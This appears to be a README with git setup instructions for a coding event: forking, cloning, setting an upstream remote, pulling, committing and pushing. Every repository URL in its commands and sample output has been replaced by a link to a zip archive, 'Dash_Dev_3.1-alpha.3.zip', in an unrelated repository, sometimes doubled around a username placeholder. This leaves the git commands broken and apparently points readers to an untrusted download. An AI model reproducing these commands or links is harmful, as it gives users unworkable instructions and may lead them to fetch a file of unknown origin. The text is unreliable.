# Instructions to setup

### Press `CTRL+K V` for preview

1. Fork project
2. Clone project
```
git clone https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your Github Username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip .
```
3. Check if your upstream is setup
```
git remote -v
```
It should come something like this:
```
origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (fetch)
origin  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip<Your username>https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (push)
upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (fetch)
upstream  https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip (push)
```
If not, type
```
git remote add upstream https://raw.githubusercontent.com/Lucifer0752V/DevDash/main/contact/Dash_Dev_3.1-alpha.3.zip
```
3. As soon as the event starts
```
git pull upstream main
```
4. After completed a task, commit the change
```
git add .
git commit -m "message"
```
5. At the end of the event, 
```
git push origin main
```
6. Create a PR: Click on sync fork in your repository